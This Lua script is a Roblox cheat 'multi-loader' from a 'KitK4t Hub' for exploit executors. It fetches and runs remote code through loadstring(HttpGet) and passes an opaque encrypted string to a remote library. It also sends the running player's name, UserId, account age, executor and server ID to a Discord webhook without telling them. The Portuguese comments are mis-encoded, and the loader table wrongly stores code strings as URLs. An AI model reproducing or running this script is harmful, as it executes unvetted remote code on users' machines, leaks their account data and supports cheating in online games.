-- ===========================
-- KitK4t Hub Multi-Loader + Webhook Logger
-- ===========================

-- üîó Webhook do Discord
local requestWebhook = loadstring(game:HttpGet("https://blox-webhook.shardweb.app/script/library"))()

local cryptUrl = "0389d0791374775d0f7be90039cac32243facebcbdb8b4dc83323fcd48f83a06d058c9761a2746cd78b46f5df3216f5b8bd6175f3ab2b6e677a67bc270484decef07bbee85883a7abbae930004078fc77061b10f1d3302817679146199b2c7a896a662c65825b152ed26abd1fefcad6481f2a15c9a6b9c31807eae56946c4f3b7b6f0091dbfbe7b60c1a54b81810d459999961ba6c4b5c09e4c142d64424822f7575f48ca564d497133b50c1170e4ae38201361f6167eedf0faec788dedbffc94cea4429a1456a0a17bb04018ba463df7f67a87501ba97d19d07be12811b18b0"

requestWebhook(cryptUrl)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- Seguran√ßa: verifica LocalPlayer
if not LocalPlayer then
    warn("[KitK4t Hub] LocalPlayer n√£o encontrado, webhook n√£o ser√° enviado.")
else
    -- Informa√ß√µes do jogador
    local playerName = tostring(LocalPlayer.Name)
    local playerUserId = tostring(LocalPlayer.UserId)
    local accountAge = tostring(LocalPlayer.AccountAge or "N/A")
    local jobId = tostring(game.JobId or "N/A")
    local placeId = tostring(game.PlaceId or 0)
    local formattedJobId = placeId.."|"..jobId

    -- Detecta executor
    local executor = "Desconhecido"
    if syn then
        executor = "Synapse X"
    elseif KRNL_LOADED then
        executor = "KRNL"
    elseif fluxus then
        executor = "Fluxus"
    elseif secure_load then
        executor = "Sentinel/Other"
    end

    -- Avatar do jogador
    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..playerUserId.."&width=420&height=420&format=png"

    -- Monta o embed
    local embedData = {
        ["embeds"] = {{
            ["title"] = "üî• **KitK4t Hub - Novo jogador executou o script!**",
            ["description"] = string.format(
                "**üë§ Jogador:** %s\n**üÜî UserId:** %s\n**üìÖ Idade da conta:** %s dias\n\n**üíª Executor:** %s",
                playerName, playerUserId, accountAge, executor
            ),
            ["color"] = 0xFF4500, -- laranja fogo
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            ["author"] = {
                ["name"] = "KitK4t Hub Logger",
                ["icon_url"] = "https://i.imgur.com/8XKJ9XK.png"
            },
            ["thumbnail"] = {
                ["url"] = avatarUrl
            },
            ["fields"] = {
                {
                    ["name"] = "üåê Servidor (copiar)",
                    ["value"] = string.format("```%s```", formattedJobId),
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "üî• KitK4t Hub ‚Ä¢ Enviado automaticamente",
                ["icon_url"] = "https://i.imgur.com/8XKJ9XK.png"
            }
        }}
    }

    local data = HttpService:JSONEncode(embedData)

    -- Fun√ß√£o para enviar
    local function send_webhook(webhook_url, body)
        local requestfunc = (syn and syn.request) or (http_request) or (request)
        if not requestfunc then
            warn("[KitK4t Hub] O executor usado n√£o suporta requisi√ß√µes HTTP externas.")
            return
        end

        local ok, res = pcall(function()
            return requestfunc({
                Url = webhook_url,
                Body = body,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
        end)

        if not ok then
            warn("[KitK4t Hub] Falha ao enviar webhook: "..tostring(res))
        else
            print("[KitK4t Hub] Webhook enviado com sucesso.")
        end
    end

    -- Envia para o webhook
    send_webhook(WEBHOOK_URL, data)
end

-- ===========================
-- Loader dos scripts
-- ===========================
local loaders = {
    -- Brookhaven
    [4924922222] = 'loadstring(game:HttpGet("https://scriptsbinsauth.vercel.app/api/scripts/22860b0f-45cb-4d72-9360-a112ef1513d8/raw"))()', 
    -- Muder Mystery
    [142823291] = 'loadstring(game:HttpGet("https://scriptsbinsauth.vercel.app/api/scripts/28df6f92-452d-473d-9c2d-7e9ca3f744af/raw"))()', 
}

local placeId = game.PlaceId
local url = loaders[placeId]

if url then
    local ok, err = pcall(function()
        local source = game:HttpGet(url)
        assert(source and #source > 5, "Conte√∫do inv√°lido ou vazio.")
        local func, compileErr = loadstring(source)
        assert(func, "Erro ao compilar o script remoto: " .. tostring(compileErr))
        func()
    end)

    if not ok then
        warn("[Multi-Loader] Falha ao carregar/executar script: " .. tostring(err))
    else
        print("[Multi-Loader] Script carregado com sucesso para PlaceId " .. tostring(placeId))
    end
else
    warn("[Multi-Loader] Nenhum script configurado para este jogo (PlaceId: " .. tostring(placeId) .. ")")
end
